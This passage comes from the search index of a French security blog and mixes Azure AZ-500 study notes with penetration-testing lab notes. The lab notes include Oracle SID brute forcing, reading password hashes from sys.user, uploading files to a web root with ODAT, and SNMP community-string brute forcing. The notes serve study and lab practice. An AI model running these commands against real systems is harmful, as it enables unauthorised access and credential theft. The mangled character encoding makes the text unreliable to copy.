accessibles.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"La gestion des identit√©s privil√©gi√©es (Privileged Identity Management) permet l\u0026rsquo;activation des r√¥les en fonction du temps et des approbations afin de r√©duire les risques d\u0026rsquo;autorisations d\u0026rsquo;acc√®s excessives, inutiles ou abusives sur les ressources qui vous sont importantes. Voici quelques-unes de ses principales fonctionnalit√©s¬†:\nFournissez un acc√®s privil√©gi√© juste √† temps aux ressources Microsoft Entra ID et Azure. Attribuez un acc√®s limit√© dans le temps aux ressources √† l‚Äôaide de dates de d√©but et de fin. Exiger une approbation pour activer les r√¥les privil√©gi√©s. Appliquez l‚Äôauthentification multifacteur pour activer n‚Äôimporte quel r√¥le. Utilisez la justification pour comprendre pourquoi les utilisateurs s\u0026rsquo;activent. Recevez des notifications lorsque des r√¥les privil√©gi√©s sont activ√©s. Effectuez des examens d‚Äôacc√®s pour vous assurer que les utilisateurs ont toujours besoin de r√¥les. T√©l√©chargez l\u0026rsquo;historique d\u0026rsquo;audit pour un audit interne ou externe. Emp√™che la suppression des derni√®res attributions de r√¥le d\u0026rsquo;administrateur global et d\u0026rsquo;administrateur de r√¥le privil√©gi√© actives. Une fois Privileged Identity Management configur√©, les options T√¢ches, G√©rer et Activit√© s\u0026rsquo;affichent dans le menu de navigation de gauche. En tant qu\u0026rsquo;administrateur, vous pouvez choisir entre des options telles que la gestion des r√¥les Microsoft Entra, la gestion des r√¥les de ressources Azure ou PIM pour les groupes. Lorsque vous choisissez ce que vous souhaitez g√©rer, les options correspondantes s\u0026rsquo;affichent.\nPour les r√¥les Microsoft Entra dans Privileged Identity Management, seul un utilisateur disposant du r√¥le d\u0026rsquo;administrateur de r√¥les privil√©gi√©s ou d\u0026rsquo;administrateur g√©n√©ral peut g√©rer les affectations des autres administrateurs. Les administrateurs g√©n√©raux, les administrateurs de s√©curit√©, les lecteurs g√©n√©raux et les lecteurs de s√©curit√© peuvent √©galement consulter les affectations aux r√¥les Microsoft Entra dans Privileged Identity Management.\n","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-privileged-identity-management/","summary":"\u003cp\u003eLa gestion des identit√©s privil√©gi√©es (Privileged Identity Management) permet l\u0026rsquo;activation des r√¥les en fonction du temps et des approbations afin de r√©duire les risques d\u0026rsquo;autorisations d\u0026rsquo;acc√®s excessives, inutiles ou abusives sur les ressources qui vous sont importantes. Voici quelques-unes de ses principales fonctionnalit√©s¬†:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFournissez un acc√®s privil√©gi√© juste √† temps aux ressources Microsoft Entra ID et Azure.\u003c/li\u003e\n\u003cli\u003eAttribuez un acc√®s limit√© dans le temps aux ressources √† l‚Äôaide de dates de d√©but et de fin.\u003c/li\u003e\n\u003cli\u003eExiger une approbation pour activer les r√¥les privil√©gi√©s.\u003c/li\u003e\n\u003cli\u003eAppliquez l‚Äôauthentification multifacteur pour activer n‚Äôimporte quel r√¥le.\u003c/li\u003e\n\u003cli\u003eUtilisez la justification pour comprendre pourquoi les utilisateurs s\u0026rsquo;activent.\u003c/li\u003e\n\u003cli\u003eRecevez des notifications lorsque des r√¥les privil√©gi√©s sont activ√©s.\u003c/li\u003e\n\u003cli\u003eEffectuez des examens d‚Äôacc√®s pour vous assurer que les utilisateurs ont toujours besoin de r√¥les.\u003c/li\u003e\n\u003cli\u003eT√©l√©chargez l\u0026rsquo;historique d\u0026rsquo;audit pour un audit interne ou externe.\u003c/li\u003e\n\u003cli\u003eEmp√™che la suppression des derni√®res attributions de r√¥le d\u0026rsquo;administrateur global et d\u0026rsquo;administrateur de r√¥le privil√©gi√© actives.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUne fois Privileged Identity Management configur√©, les options T√¢ches, G√©rer et Activit√© s\u0026rsquo;affichent dans le menu de navigation de gauche. En tant qu\u0026rsquo;administrateur, vous pouvez choisir entre des options telles que la gestion des r√¥les Microsoft Entra, la gestion des r√¥les de ressources Azure ou PIM pour les groupes. Lorsque vous choisissez ce que vous souhaitez g√©rer, les options correspondantes s\u0026rsquo;affichent.\u003c/p\u003e","title":""},{"content":"La solution d\u0026rsquo;identifiants v√©rifiables de Microsoft utilise des identifiants d√©centralis√©s (DID) pour signer de mani√®re cryptographique afin de prouver qu\u0026rsquo;une partie utilisatrice (v√©rificateur) atteste des informations prouvant sa propri√©t√©. Une compr√©hension de base des DID est recommand√©e √† toute personne cr√©ant une solution d\u0026rsquo;identifiants v√©rifiables bas√©e sur l\u0026rsquo;offre Microsoft.\n","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-verified-id/","summary":"\u003cp\u003eLa solution d\u0026rsquo;identifiants v√©rifiables de Microsoft utilise des identifiants d√©centralis√©s (DID) pour signer de mani√®re cryptographique afin de prouver qu\u0026rsquo;une partie utilisatrice (v√©rificateur) atteste des informations prouvant sa propri√©t√©. Une compr√©hension de base des DID est recommand√©e √† toute personne cr√©ant une solution d\u0026rsquo;identifiants v√©rifiables bas√©e sur l\u0026rsquo;offre Microsoft.\u003c/p\u003e","title":""},{"content":"Planifier et impl√©menter la s√©curit√© pour les r√©seaux virtuels Qu‚Äôest-ce qu‚Äôun r√©seau virtuel Azure ? Le r√©seau virtuel Azure est un service qui fournit le bloc de construction fondamental de votre r√©seau priv√© dans Azure.\nCommuniquer entre les ressources Azure Les ressources Azure communiquent en toute s√©curit√© entre elles de l‚Äôune des mani√®res suivantes :\nR√©seau virtuel : vous pouvez d√©ployer des machines virtuelles et d‚Äôautres types de ressources Azure dans un r√©seau virtuel. Des exemples de ressources incluent les environnements App Service, Azure Kubernetes Service (AKS) et Microsoft Azure Virtual Machine Scale Sets Communiquer avec les ressources locales R√©seau priv√© virtuel de point √† site (VPN) : √©tabli entre un r√©seau virtuel et un seul ordinateur de votre r√©seau.Une connexion par passerelle VPN point √† site (P2S) vous permet de cr√©er une connexion s√©curis√©e √† votre r√©seau virtuel √† partir d‚Äôun ordinateur de client individuel. VPN de site √† site : √©tabli entre votre appareil VPN local et une passerelle VPN Azure d√©ploy√©e dans un r√©seau virtuel. Azure ExpressRoute : √©tabli entre votre r√©seau et Azure, via un partenaire ExpressRoute. Cette connexion est priv√©e. Filtrer le trafic r√©seau Vous pouvez filtrer le trafic r√©seau entre les sous-r√©seaux en utilisant l‚Äôune ou l‚Äôautre des options suivantes :\nGroupes de s√©curit√© r√©seau : les groupes de s√©curit√© r√©seau et les groupes de s√©curit√© d‚Äôapplication peuvent contenir plusieurs r√®gles de s√©curit√© entrantes et sortantes. Appliances virtuelles r√©seau : une appliance virtuelle r√©seau est une machine virtuelle qui ex√©cute une fonction r√©seau, telle qu‚Äôun pare-feu ou une optimisation WAN. Azure Virtual Network Manager Azure Virtual Network Manager est un service de gestion qui vous permet de regrouper, de configurer, de d√©ployer et de g√©rer des r√©seaux virtuels globalement sur l‚Äôensemble des abonnements\nPlanifier et impl√©menter des groupes de s√©curit√© r√©seau (NSG) et des groupes de s√©curit√© d‚Äôapplication (ASG) Groupes de s√©curit√© r√©seau (NSG) Les r√®gles de s√©curit√© sont √©valu√©es et appliqu√©es en fonction des informations de cinq tuples (1. source, 2. port source, 3. destination, 4. port de destination et 5. protocole)\nPlanifier et impl√©menter des itin√©raires User-Defined (UDR) Vous pouvez sp√©cifier les types de sauts suivants lors de la cr√©ation d‚Äôun itin√©raire d√©fini par l‚Äôutilisateur :\nAppliance virtuelle : une appliance virtuelle est une machine virtuelle qui ex√©cute g√©n√©ralement une application r√©seau, telle qu‚Äôun pare-feu. Passerelle de r√©seau virtuel : sp√©cifiez quand vous souhaitez que le trafic destin√© aux pr√©fixes d‚Äôadresses sp√©cifiques achemin√©s vers une passerelle de r√©seau virtuel. Aucun : sp√©cifiez quand vous souhaitez supprimer le trafic vers un pr√©fixe d‚Äôadresse, plut√¥t que de transf√©rer le trafic vers une destination. R√©seau virtuel : sp√©cifiez l‚Äôoption de r√©seau virtuel lorsque vous souhaitez remplacer le routage par d√©faut au sein d‚Äôun r√©seau virtuel. Internet : sp√©cifiez l‚Äôoption Internet lorsque vous souhaitez acheminer explicitement le trafic destin√© √† un pr√©fixe d‚Äôadresse vers Internet, ou si vous souhaitez que le trafic destin√© aux services Azure avec des adresses IP publiques conserv√©es dans le r√©seau principal Azure. Planifier et impl√©menter un r√©seau √©tendu virtuel, y compris un hub virtuel s√©curis√© Une instance Virtual WAN vous connecte √† vos ressources dans Azure via une connexion VPN IPsec/IKE (IKEv1 et IKEv2). Ce type de connexion requiert un p√©riph√©rique VPN local disposant d‚Äôune adresse IP publique expos√©e en externe.\nChiffrement Azure Cette unit√© fournit une vue d‚Äôensemble de l‚Äôutilisation du chiffrement dans Microsoft Azure. Il couvre les principales zones de chiffrement, notamment le chiffrement au repos, le chiffrement en vol et la gestion des cl√©s avec Azure Key Vault.\nChiffrement des donn√©es au repos Les donn√©es au repos incluent des informations qui r√©sident dans un stockage persistant sur un support physique, dans n‚Äôimporte quel format num√©rique. Il peut s‚Äôagir de fichiers sur un support magn√©tique ou optique, de donn√©es archiv√©es et de sauvegardes de donn√©es.\nChiffrement c√¥t√© serveur Cl√©s g√©r√©es par le service : offre une combinaison de contr√¥le et de commodit√© avec une faible surcharge. Cl√©s g√©r√©es par le client : vous permettent de contr√¥ler les cl√©s, y compris la prise en charge de la fonctionnalit√© BYOK (Apportez vos propres cl√©s), ou vous permettent de g√©n√©rer de nouvelles cl√©s. Cl√©s g√©r√©es par le service dans le mat√©riel contr√¥l√© par le client : vous permet de g√©rer des cl√©s dans votre r√©f√©rentiel propri√©taire, en dehors du contr√¥le Microsoft. Cette caract√©ristique est appel√©e HYOK (Host Your Own Key). Toutefois, la configuration est complexe et la plupart des services Azure ne prennent pas en charge ce mod√®le Qu‚Äôest-ce que Liaison priv√©e Azure Azure Private Link vous permet d‚Äôacc√©der aux services Azure PaaS (par exemple Stockage Azure et SQL Database) ainsi qu‚Äôaux services de partenaires ou de clients h√©berg√©s par Azure sur un¬†point de terminaison priv√©¬†dans votre r√©seau virtuel.\nSuperviser la s√©curit√© r√©seau en utilisant Network Watcher Azure Network Watcher fournit une suite d‚Äôoutils permettant de surveiller, diagnostiquer, afficher les m√©triques et activer ou d√©sactiver les journaux d‚Äôactivit√© pour les ressources Azure IaaS (Infrastructure-as-a-Service). Network Watcher se compose de trois principaux ensembles d‚Äôoutils et de fonctionnalit√©s :\nSupervision\nOutils de diagnostic r√©seau\nTrafic\n","permalink":"https://nyobemichel.me/posts/azure/s%C3%A9curiser-la-mise-en-r%C3%A9seau---az-500/","summary":"\u003ch1 id=\"planifier-et-impl√©menter-la-s√©curit√©-pour-les-r√©seaux-virtuels\"\u003ePlanifier et impl√©menter la s√©curit√© pour les r√©seaux virtuels\u003c/h1\u003e\n\u003ch1 id=\"quest-ce-quun-r√©seau-virtuel-azure-\"\u003eQu‚Äôest-ce qu‚Äôun r√©seau virtuel Azure ?\u003c/h1\u003e\n\u003cp\u003eLe r√©seau virtuel Azure est un service qui fournit le bloc de construction fondamental de votre r√©seau priv√© dans Azure.\u003c/p\u003e\n\u003ch3 id=\"communiquer-entre-les-ressources-azure\"\u003eCommuniquer entre les ressources Azure\u003c/h3\u003e\n\u003cp\u003eLes ressources Azure communiquent en toute s√©curit√© entre elles de l‚Äôune des mani√®res suivantes :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eR√©seau virtuel : vous pouvez d√©ployer des machines virtuelles et d‚Äôautres types de ressources Azure dans un r√©seau virtuel. Des exemples de ressources incluent les environnements App Service, Azure Kubernetes Service (AKS) et Microsoft Azure Virtual Machine Scale Sets\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"communiquer-avec-les-ressources-locales\"\u003eCommuniquer avec les ressources locales\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eR√©seau priv√© virtuel de point √† site (VPN) : √©tabli entre un r√©seau virtuel et un seul ordinateur de votre r√©seau.Une connexion par passerelle VPN point √† site (P2S) vous permet de cr√©er une connexion s√©curis√©e √† votre r√©seau virtuel √† partir d‚Äôun ordinateur de client individuel.\u003c/li\u003e\n\u003cli\u003eVPN de site √† site : √©tabli entre votre appareil VPN local et une passerelle VPN Azure d√©ploy√©e dans un r√©seau virtuel.\u003c/li\u003e\n\u003cli\u003eAzure ExpressRoute : √©tabli entre votre r√©seau et Azure, via un partenaire ExpressRoute. Cette connexion est priv√©e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"filtrer-le-trafic-r√©seau\"\u003eFiltrer le trafic r√©seau\u003c/h3\u003e\n\u003cp\u003eVous pouvez filtrer le trafic r√©seau entre les sous-r√©seaux en utilisant l‚Äôune ou l‚Äôautre des options suivantes :\u003c/p\u003e","title":""},{"content":"Zero Trust est un nouveau mod√®le de s√©curit√© qui pr√©suppose une violation et v√©rifie chaque requ√™te comme si elle provenait d\u0026rsquo;un r√©seau non contr√¥l√©.\nPrincipes directeurs du Zero Trust Pour r√©pondre √† ce nouveau monde de l\u0026rsquo;informatique, Microsoft recommande vivement le mod√®le de s√©curit√© Zero Trust, qui repose sur ces principes directeurs¬†:\nV√©rifier explicitement¬†- Authentifiez et autorisez toujours en fonction de tous les points de donn√©es disponibles.\nUtilisez l\u0026rsquo;acc√®s au moindre privil√®ge¬†- Limitez l\u0026rsquo;acc√®s des utilisateurs avec l\u0026rsquo;acc√®s juste-√†-temps et juste-assez-suffisant (JIT/JEA), les politiques adaptatives bas√©es sur les risques et la protection des donn√©es.\nSupposons une br√®che¬†: minimisez le rayon d\u0026rsquo;impact et segmentez l\u0026rsquo;acc√®s. V√©rifiez le chiffrement de bout en bout et utilisez l\u0026rsquo;analyse pour obtenir une visibilit√©, am√©liorer la d√©tection des menaces et renforcer les d√©fenses.\n","permalink":"https://nyobemichel.me/posts/azure/zero-trust/","summary":"\u003cp\u003eZero Trust est un nouveau mod√®le de s√©curit√© qui pr√©suppose une violation et v√©rifie chaque requ√™te comme si elle provenait d\u0026rsquo;un r√©seau non contr√¥l√©.\u003c/p\u003e\n\u003ch2 id=\"principes-directeurs-du-zero-trust\"\u003ePrincipes directeurs du Zero Trust\u003c/h2\u003e\n\u003cp\u003ePour r√©pondre √† ce nouveau monde de l\u0026rsquo;informatique, Microsoft recommande vivement le mod√®le de s√©curit√© Zero Trust, qui repose sur ces principes directeurs¬†:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eV√©rifier explicitement\u003c/strong\u003e¬†- Authentifiez et autorisez toujours en fonction de tous les points de donn√©es disponibles.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUtilisez l\u0026rsquo;acc√®s au moindre privil√®ge\u003c/strong\u003e¬†- Limitez l\u0026rsquo;acc√®s des utilisateurs avec l\u0026rsquo;acc√®s juste-√†-temps et juste-assez-suffisant (JIT/JEA), les politiques adaptatives bas√©es sur les risques et la protection des donn√©es.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---azure/","summary":"","title":""},{"content":"Le serveur¬†Oracle Transparent Network Substrate(¬†TNS) est un protocole de communication qui facilite la communication entre les bases de donn√©es et les applications Oracle sur les r√©seaux.\nAvant de pouvoir √©num√©rer l\u0026rsquo;√©couteur TNS et interagir avec lui, nous devons t√©l√©charger quelques paquets et outils\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip sudo mkdir -p /opt/oracle sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH export PATH=$LD_LIBRARY_PATH:$PATH source ~/.bashrc git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap git submodule init git submodule update pip3 install cx_Oracle sudo apt-get install python3-scapy -y sudo pip3 install colorlog termcolor passlib python-libnmap sudo apt-get install build-essential libgmp-dev -y pip3 install pycryptodome ./odat.py -h # si l\u0026#39;instalation a reuissi Oracle Database Attacking Tool (¬†ODAT) est un outil de test d\u0026rsquo;intrusion open source √©crit en Python et con√ßu pour recenser et exploiter les vuln√©rabilit√©s des bases de donn√©es Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de s√©curit√© dans les bases de donn√©es Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;ex√©cution de code √† distance et l\u0026rsquo;√©l√©vation de privil√®ges.\nBrute force SID sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute ./odat.py all -s 10.129.204.235 SQLplus pour se connecter a la bd\nsqlplus username/password@10.129.204.235/XE Si vous rencontrez l\u0026rsquo;erreur suivante¬†sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, veuillez ex√©cuter ce qui suit, extrait d\u0026rsquo;¬†ici¬†.\nsudo sh -c \u0026#34;echo /usr/lib/oracle/12.2/client64/lib \u0026gt; /etc/ld.so.conf.d/oracle-instantclient.conf\u0026#34;;sudo ldconfig sqlplus username/password@10.129.204.235/XE as sysdba SQL\u0026gt; select * from user_role_privs; SQL\u0026gt; select name, password from sys.user Telechargement de fichier\n./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---oracle-tns/","summary":"\u003cp\u003eLe serveur¬†\u003ccode\u003eOracle Transparent Network Substrate\u003c/code\u003e(¬†\u003ccode\u003eTNS\u003c/code\u003e) est un protocole de communication qui facilite la communication entre les bases de donn√©es et les applications Oracle sur les r√©seaux.\u003c/p\u003e\n\u003cp\u003eAvant de pouvoir √©num√©rer l\u0026rsquo;√©couteur TNS et interagir avec lui, nous devons t√©l√©charger quelques paquets et outils\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mkdir -p /opt/oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/opt/oracle/instantclient_21_4:\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.bashrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/quentinhardy/odat.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e odat/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install cx_Oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install python3-scapy -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo pip3 install colorlog termcolor passlib python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install build-essential libgmp-dev -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install pycryptodome\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./odat.py -h \u003cspan class=\"c1\"\u003e# si l\u0026#39;instalation a reuissi \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOracle Database Attacking Tool (¬†\u003ccode\u003eODAT\u003c/code\u003e) est un outil de test d\u0026rsquo;intrusion open source √©crit en Python et con√ßu pour recenser et exploiter les vuln√©rabilit√©s des bases de donn√©es Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de s√©curit√© dans les bases de donn√©es Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;ex√©cution de code √† distance et l\u0026rsquo;√©l√©vation de privil√®ges.\u003c/p\u003e","title":""},{"content":"Simple Network Management Protocol SNMP a √©t√© cr√©√© pour surveiller les p√©riph√©riques r√©seau. Ce protocole permet √©galement de g√©rer les t√¢ches de configuration et de modifier les param√®tres √† distance.\nPour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que¬†snmpwalk,¬†onesixtyoneet¬†braa.¬†SnmpwalkIl permet d\u0026rsquo;interroger les OID avec leurs informations.\nsnmpwalk -v2c -c public 10.129.14.128 snmpwalk -v2c -c backup 10.129.109.205 Community: admin manager public private backup sudo apt install onesixtyone onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128 utiliser avec¬†braa¬†pour forcer les OID individuels et √©num√©rer les informations qui se cachent derri√®re eux\nsudo apt install braa braa \u0026lt;community string\u0026gt;@\u0026lt;IP\u0026gt;:.1.3.6.* # Syntax braa public@10.129.14.128:.1.3.6.* ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---snmp/","summary":"\u003cp\u003e\u003ccode\u003eSimple Network Management Protocol\u003c/code\u003e SNMP a √©t√© cr√©√© pour surveiller les p√©riph√©riques r√©seau. Ce protocole permet √©galement de g√©rer les t√¢ches de configuration et de modifier les param√®tres √† distance.\u003c/p\u003e\n\u003cp\u003ePour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que¬†\u003ccode\u003esnmpwalk\u003c/code\u003e,¬†\u003ccode\u003eonesixtyone\u003c/code\u003eet¬†\u003ccode\u003ebraa\u003c/code\u003e.¬†\u003ccode\u003eSnmpwalk\u003c/code\u003eIl permet d\u0026rsquo;interroger les OID avec leurs informations.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c public 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c backup 10.129.109.205\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCommunity:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epublic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprivate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebackup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install onesixtyone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eonesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eutiliser avec¬†\u003ca href=\"https://github.com/mteg/braa\"\u003ebraa\u003c/a\u003e¬†pour forcer les OID individuels et √©num√©rer les informations qui se cachent derri√®re eux\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/formations/api-attack-and-defense/","summary":"","title":""},{"content":"[[Shells \u0026amp; Payloads]]\n","permalink":"https://nyobemichel.me/posts/formations/cpts---hackthebox/","summary":"\u003cp\u003e[[Shells \u0026amp; Payloads]]\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;objectif principal de cette op√©ration Red Team est d\u0026rsquo;√©valuer la s√©curit√© de l\u0026rsquo;environnement de l\u0026rsquo;entreprise. Cette mission vise √† identifier les vuln√©rabilit√©s et les erreurs de configuration de l\u0026rsquo;environnement AD et √† formuler des recommandations concr√®tes pour renforcer la s√©curit√© de l\u0026rsquo;infrastructure.\nExploitation du reseaux externe de l\u0026rsquo;entreprise Enumeration ","permalink":"https://nyobemichel.me/posts/labs/crta----cyberwarfare/","summary":"\u003cp\u003eL\u0026rsquo;objectif principal de cette op√©ration Red Team est d\u0026rsquo;√©valuer la s√©curit√© de l\u0026rsquo;environnement de l\u0026rsquo;entreprise. Cette mission vise √† identifier les vuln√©rabilit√©s et les erreurs de configuration de l\u0026rsquo;environnement AD et √† formuler des recommandations concr√®tes pour renforcer la s√©curit√© de l\u0026rsquo;infrastructure.\u003c/p\u003e\n\u003ch1 id=\"exploitation-du-reseaux-externe-de-lentreprise\"\u003eExploitation du reseaux externe de l\u0026rsquo;entreprise\u003c/h1\u003e\n\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/labs/mailservice/","summary":"","title":""},{"content":"SUMMUS: Extreme Red Teamer Lab https://extremeredlab.0x29a.it/redteamlabs\nEnumeration nmap nmap -sn 10.8.0.130/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 14:50 CEST Nmap scan report for 10.8.0.1 Host is up (0.10s latency). Nmap scan report for 10.8.0.34 Host is up (0.37s latency). Nmap scan report for 10.8.0.46 Host is up (0.38s latency). Nmap scan report for 10.8.0.130 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 35.63 seconds nmap -sV -sC 10.8.0.46 -v \u0026ndash;min-rate 1000 -Pn -T4 -p-\nnmap -sV -sC 10.8.0.34 -v \u0026ndash;min-rate 1000 -Pn -T4 -p-\nPORT STATE SERVICE VERSION 1716/tcp open tcpwrapped ","permalink":"https://nyobemichel.me/posts/labs/summus/","summary":"\u003cp\u003eSUMMUS: Extreme Red Teamer Lab\n\u003ca href=\"https://extremeredlab.0x29a.it/redteamlabs\"\u003ehttps://extremeredlab.0x29a.it/redteamlabs\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 